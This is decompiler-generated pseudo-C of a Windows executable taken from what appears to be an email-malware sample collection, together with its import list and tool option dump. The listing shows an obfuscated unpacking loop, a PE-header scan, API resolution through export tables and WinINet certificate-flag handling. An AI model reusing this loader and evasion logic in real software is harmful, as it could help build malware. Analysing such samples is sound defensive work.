/*	This file was automatically created by
 *	Reverse Engineering Compiler 1.6 (C) Giampiero Caprino (Mar 31 2002)
 *	Input file: './malware_via_email/malware_0148/ia32_pe/subject.exe'
 */

/* DEST BLOCK NOT FOUND: 0040101d -> 00400ff1 */
/* DEST BLOCK NOT FOUND: 00401031 -> 004010a0 */
/* DEST BLOCK NOT FOUND: 00401041 -> 004010a0 */
/*	Procedure: 0x00401000 - 0x0040104E
 *	Argument size: 4
 *	Local size: 0
 *	Save regs size: 0
 */

__entry_point__(A100)
/* unknown */ void  A100;
{
	/* unknown */ void  Vffe847a5;



    ecx = ecx + 284194;
    ebx = ebx + 1;
    edx = 2310725;
    ebx = 57005;
    asm("o16 movd mm2,eax");
    asm("Unknown opcode 0x66");
    asm("Unknown opcode 0x0f");
    if(ecx = A100 + 1110) {
        goto L00400ff1;
    }
    esp = esp + 1;
    asm("o16 movd ecx,mm2");
    if(ecx != A100) {
        goto L0040104F;
    }
    asm("o16 movd eax,mm2");
    if(A100 == 10000) {
        goto L004010a0;
    }
    asm("mul ebx");
    if(A100 > 1341924402) {
        goto L004010a0;
    }
    L00401816();
    ecx = & Vffe847a5;
}

/*	Procedure: 0x0040104F - 0x004017A0
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 0
 */

L0040104F()
{



    (save)ecx;
    ecx = *L7FFE02D0;
    if(ecx == 274) {
        ecx = ecx - 2;
    }
    if(ecx == 0) {
        ecx = ecx + 272;
    }
    if(ecx > 512) {
        ecx = ecx - 512;
    }
    (save)eax;
    (save)ebx;
    eax = 10691665;
    asm("mul ecx");
    eax = ~eax;
    asm("xchg eax,edx");
    (restore)ebx;
    (restore)eax;
    eax = L004017A1() - edx;
    *edi = eax;
    edi = edi + 5912344;
    (restore)ecx;
    edi = edi - 5912340;
    return;
}

/*	Procedure: 0x004017A1 - 0x00401815
 *	Argument size: -4
 *	Local size: 4
 *	Save regs size: 0
 */

L004017A1()
{
	/* unknown */ void  Vfffffffc;



    Vfffffffc = 0;
    asm("pusha");
    edx = 0;
    ecx = 8653;
L004017b6:
    esi = 8306;
L004017bb:
    asm("rep pmulhrw mm1,[esp]");
    asm("Unknown opcode 0x66");
    asm("Unknown opcode 0x0f");
    goto L00001e14;
    (restore)edx;
    (restore)ecx;
    ecx = ecx + eax;
    if(edx + 1 <= 3464) {
        goto L004017bb;
    }
    (save)ecx;
    (save) & Vfffffffc;
    (save)4;
    (save)2;
    (save)edi;
    eax = *(ecx + ebx + -3465)(-1);
    asm("o16 movd mm0,eax");
    asm("Unknown opcode 0xf2");
    asm("Unknown opcode 0x0f");
    >= ? 0x4017b1 : ;
    asm("Unknown opcode 0x66");
    asm("Unknown opcode 0x0f");
    if(eax = eax + 1) {
        goto L004017b6;
    }
    asm("o16 movd eax,mm0");
    eax = eax >> 16;
    64 = eax * eax;
    (restore)ecx;
    eax = *(ecx + ebx + -3465)(-1, edi, 2, eax, & Vfffffffc);
    asm("popa");
}

/*	Procedure: 0x00401816 - 0x004018A0
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 0
 */

L00401816()
{



    asm("xchg edx,esi");
    (restore)edx;
    for(dx = 0; *edx != 77 || *(edx + 1) != 90; edx = edx + -4096) {
    }
    ebx = edx;
    ecx = 52870967;
    asm("clc");
    ecx = ecx - 52869891;
    (save)-21504;
    asm("clc");
    esi = 4530740;
    (restore)esi;
    asm("cld");
    esi = ~esi + edx;
    edx = esi;
    edi = edx;
    (save)edx;
    do {
        eax = *esi;
        esi = esi + 4;
        eax = eax - 36719934;
        eax = L0040104F();
    } while(ecx - 4751210 + 4751209 != 0);
    return;
    asm("int3");
    al = al & *eax;
    (save) *L00402068();
    esi = *L0040206c();
    if(esi != 0) {
        *esi( *L00402070(), ebp - 4);
    }
    eax = *(ebp - 4);
    (restore)esi;
    (restore)ebp;
}

/*	Procedure: 0x004018A1 - 0x004019E2
 *	Argument size: 4
 *	Local size: 324
 *	Save regs size: 4
 */

L004018A1(A8)
/* unknown */ void  A8;
{
	/* unknown */ void  ebx;
	/* unknown */ void  Vfffffebc;
	/* unknown */ void  Vffffffc0;
	/* unknown */ void  Vffffffcc;
	/* unknown */ void  Vffffffd0;
	/* unknown */ void  Vffffffd4;
	/* unknown */ void  Vffffffd8;
	/* unknown */ void  Vffffffec;
	/* unknown */ void  Vfffffff0;
	/* unknown */ void  Vfffffffc;



    ebx = 0;
    (save)edi;
    Vfffffffc = 260;
    edi = 0x403120;
    if(*L00403120 == 0) {
        (save)4203248;
        eax = L00401AAC( *L00402018());
        if(eax != ebx) {
            (save) & Vfffffffc;
            (save)edi;
            (save)ebx;
            *eax();
        }
        if(*L00403120 == bl) {
            edi = 4203260;
        }
    }
    (save)ebx;
    (save)ebx;
    (save)ebx;
    (save)ebx;
    (save)edi;
    eax = *L004020b0();
    *esi = eax;
    if(eax != ebx) {
        eax = A8;
        edi = eax + 1;
        do {
            cl = *eax;
            eax = eax + 1;
        } while(cl != bl);
        (save)64;
        (save)12288;
        edi = eax - edi + 1;
        (save)edi;
        (save)ebx;
        Vfffffffc = *L00402030();
        L00401BB4( & Vffffffc0, ebx, 60);
        Vffffffd0 = & Vfffffebc;
        Vffffffec = Vfffffffc;
        (save) & Vffffffc0;
        (save)ebx;
        (save)ebx;
        (save)A8;
        Vffffffc0 = 60;
        Vffffffd4 = 260;
        Vfffffff0 = edi;
        *L004020ac();
        (save)ebx;
        (save)ebx;
        (save)3;
        (save)ebx;
        (save)ebx;
        (save)Vffffffd8;
        (save) & Vfffffebc;
        (save) *esi;
        eax = *L004020a0();
        edi = *L00402038;
        *(esi + 4) = eax;
        if(eax != ebx) {
            ecx = -2080374528;
            if(Vffffffcc == 4) {
                ecx = -2071985920;
            }
            (save)ebx;
            (save)ecx;
            (save)ebx;
            (save)ebx;
            (save)ebx;
            (save)Vfffffffc;
            (save)ebx;
            (save)eax;
            (save)32768;
            (save)ebx;
            (save)Vfffffffc;
            *(esi + 8) = *L004020b4();
            eax = *edi();
            if(*(esi + 8) != ebx) {
                al = 1;
                goto L004019dd;
            }
            (save) *(esi + 4);
            *L004020c4();
        }
        *L004020c4();
        eax = *edi(Vfffffffc, ebx, 32768, *esi);
    }
    al = 0;
L004019dd:
    (restore)edi;
}

stack space not deallocated on return
/*	Procedure: 0x004019E3 - 0x004019F9
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 4
 */

L004019E3()
{
	/* unknown */ void  edi;



    edi = *L004020C4;
    *edi();
    *edi();
    return(*edi( *esi, *(esi + 4), *(esi + 8)));
}

/*	Procedure: 0x004019FA - 0x00401AAB
 *	Argument size: 4
 *	Local size: 12
 *	Save regs size: 8
 */

L004019FA(A8)
/* unknown */ void  A8;
{
	/* unknown */ void  ebx;
	/* unknown */ void  esi;
	/* unknown */ void  Vfffffff4;
	/* unknown */ void  Vfffffff8;
	/* unknown */ void  Vffffffff;



    esi = *L00402074;
    (save)edi;
    ebx = 0;
    (save)0;
    *esi();
    edi = *L004020C0;
    (save)ebx;
    (save)ebx;
    (save)-1;
    (save)ebx;
    (save)A8;
    eax = *edi();
    Vffffffff = al;
    if(al == bl) {
        eax = *L00402078();
        if(eax == 12045 || eax == 12044 || eax == 12037 || eax == 12038 || eax == 12039) {
            goto L00401a55;
        }
        if(eax == 12052) {
L00401a55:
            (save) & Vfffffff4;
            (save) & Vfffffff8;
            (save)31;
            (save)A8;
            Vfffffff8 = ebx;
            Vfffffff4 = 4;
            eax = *L004020bc();
            if(eax != 0) {
                Vfffffff8 = Vfffffff8 | 62336;
                (save)4;
                (save) & Vfffffff8;
                (save)31;
                (save)A8;
                eax = *L004020b8();
                if(eax != 0) {
                    *esi();
                    Vffffffff = *edi(A8, ebx, -1, ebx, ebx, ebx);
                }
            }
        }
    }
    (restore)edi;
    return(Vffffffff);
}

/*	Procedure: 0x00401AAC - 0x00401B3B
 *	Argument size: 4
 *	Local size: 16
 *	Save regs size: 4
 */

L00401AAC(A8)
/* unknown */ void  A8;
{
	/* unknown */ void  esi;
	/* unknown */ void  Vfffffff0;
	/* unknown */ void  Vfffffff4;
	/* unknown */ void  Vfffffff8;
	/* unknown */ void  Vfffffffc;



    esi = A8;
    (save)esi;
    *L004020d4();
    if(esi == 0) {
L00401ac1:
        eax = 0;
    } else {
        (save) & Vfffffff0;
        (save)0;
        (save)1;
        eax = *L004020ec(esi);
        if(eax == 0) {
            goto L00401ac1;
        }
        edx = *(eax + 32);
        ecx = *(eax + 36);
        Vfffffffc = 0;
        (save)ebx;
        ebx = *(eax + 28);
        eax = *(eax + 24);
        ecx = ecx + esi;
        edx = edx + esi;
        ebx = ebx + esi;
        Vfffffff8 = ecx;
        Vfffffff4 = eax;
        if(eax > 0) {
            (save)edi;
            do {
                (save)22;
                esi = 4203224;
                eax = 0;
                asm("repe cmpsb");
                if(edi = *(edx + Vfffffffc * 4) + A8) {
                    break;
                }
                Vfffffffc = Vfffffffc + 1;
            } while(Vfffffffc < Vfffffff4);
            ecx = Vfffffff8;
            (restore)edi;
        }
        eax = Vfffffffc;
        eax = eax < Vfffffff4 ? *(ebx + ( *(ecx + eax * 2) & 65535) * 4) + A8 : 0;
        (restore)ebx;
    }
}

/*	Procedure: 0x00401B3C - 0x00401BB3
 *	Argument size: 8
 *	Local size: 0
 *	Save regs size: 0
 */

L00401B3C(A0, A4)
/* unknown */ void  A0;
/* unknown */ void  A4;
{



    asm("int3");
    asm("int3");
    asm("int3");
    asm("int3");
    (save)ecx;
    ecx = & A4 - eax & 15;
    eax = eax + ecx;
    asm("sbb ecx,ecx");
    eax = eax | ecx;
    (restore)ecx;
    goto L00401b70;
    (save)ecx;
    ecx = & A4 - eax & 7;
    eax = eax + ecx;
    asm("sbb ecx,ecx");
    eax = eax | ecx;
    (restore)ecx;
    goto L00401b70;
    asm("int3");
    asm("int3");
    asm("int3");
    asm("int3");
L00401b70:
    (save)ecx;
    ecx = & A0 - eax;
    asm("sbb eax,eax");
    ecx = ecx & !eax;
    for(eax = esp & -4096; ecx < eax; *eax & eax) {
        eax = eax - 4096;
    }
    eax = ecx;
    (restore)ecx;
    asm("xchg eax,esp");
    eax = *eax;
    *esp = eax;
    return(*esp);
    asm("int3");
    goto ( *L00402100);
    goto ( *L004020f8);
    goto ( *L004020e8);
    goto ( *L004020e4);
}

/* DEST BLOCK NOT FOUND: 00401bb4 -> 00401b84 */
/*	Procedure: 0x00401BB4 - 0x00401BB8
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 0
 */

L00401BB4()
{



    goto ( *L40402104);
}

/* address  size  */
/* 0x00401000       0 */ /* unknown */ void 	__entry_point__;
/* 0x00402046       0 */ /* unknown */ void 	__imp__GetDeviceCaps;
/* 0x0040204a       0 */ /* unknown */ void 	__imp__GetFontData;
/* 0x0040204e       0 */ /* unknown */ void 	__imp__EqualRgn;
/* 0x00402052       0 */ /* unknown */ void 	__imp__EndDoc;
/* 0x00402056       0 */ /* unknown */ void 	__imp__Escape;
/* 0x0040205a       0 */ /* unknown */ void 	__imp__FillPath;
/* 0x0040205e       0 */ /* unknown */ void 	__imp__CreatePalette;
/* 0x00402062       0 */ /* unknown */ void 	__imp__GetBkColor;
/* 0x00402066       0 */ /* unknown */ void 	__imp__GetBrushOrgEx;
/* 0x0040206a       0 */ /* unknown */ void 	__imp__GetCharWidthW;
/* 0x0040206e       0 */ /* unknown */ void 	__imp__GetClipBox;
/* 0x00402072       0 */ /* unknown */ void 	__imp__GdiFlush;
/* 0x00402076       0 */ /* unknown */ void 	__imp__GetMapMode;
/* 0x0040207a       0 */ /* unknown */ void 	__imp__GetMiterLimit;
/* 0x0040207e       0 */ /* unknown */ void 	__imp__GetPixel;
/* 0x00402082       0 */ /* unknown */ void 	__imp__CreateCompatibleDC;
/* 0x00402086       0 */ /* unknown */ void 	__imp__FillRgn;
/* 0x0040208a       0 */ /* unknown */ void 	__imp__GetRelAbs;
/* 0x0040208e       0 */ /* unknown */ void 	__imp__SetBkColor;
/* 0x00402092       0 */ /* unknown */ void 	__imp__GetTextFaceW;
/* 0x004021b1       0 */ /* unknown */ void 	__imp__ExitThread;
/* 0x004021b5       0 */ /* unknown */ void 	__imp__InitAtomTable;
/* 0x004021b9       0 */ /* unknown */ void 	__imp__CreateFileW;
/* 0x004021bd       0 */ /* unknown */ void 	__imp__WriteFile;
/* 0x004021c1       0 */ /* unknown */ void 	__imp__ReadFile;
/* 0x004021c5       0 */ /* unknown */ void 	__imp__SetConsoleCP;
/* 0x004021c9       0 */ /* unknown */ void 	__imp__GetModuleHandleW;
/* 0x004021cd       0 */ /* unknown */ void 	__imp__VirtualProtectEx;
#if 0 /* auxiliary information */
# Current option values:
option: +asmflush
option: -compactcalls
option: +compactexprs
option: +compactifs
option: +compset
option: -dfoproc
option: -disasmonly
option: -displaylabels
option: +doblocks
option: +docase
option: +dofor
option: +doifs
option: +dointrinsics
option: +doloops
option: +donullgotos
option: +dopackloops
option: +dopackstmt
option: +doremlabs
option: +dosimplify
option: -dosort
option: +dostmts
option: +doswitch
option: +dowhile
option: -dumpaddrs
option: -dumpcall
option: -dumpcomments
option: -dumpdfo
option: +dumpdoms
option: -dumpsblocks
option: -dumpsets
option: -dumpsizes
option: -dumpstmtid
option: +fatcase
option: -flag16
option: +fullscreen
option: -genpattern
option: -help
option: -hexconst
option: -html
option: +insertlabels
option: -int16
option: +int32
option: -interactive
option: -isvb5
option: +locals
option: -nohtmltabs
option: -nostackoffs
option: -objdump
option: -okclone
option: -outprocs
option: -outrefs
option: -overrule
option: +rdonly
option: -showblocks
option: -showjump
option: -showlabel
option: -showprotosym
option: -showreg
option: -showstring
option: -silent
option: +simplifyexprs
option: -stackalign16
option: -stackalign4
option: -stackalign8
option: -strallregions
option: -traceall
option: -tracesets
option: +types
option: -usesymtab
option: -validatebr
option: -validatereg
option: +validatestr
#endif
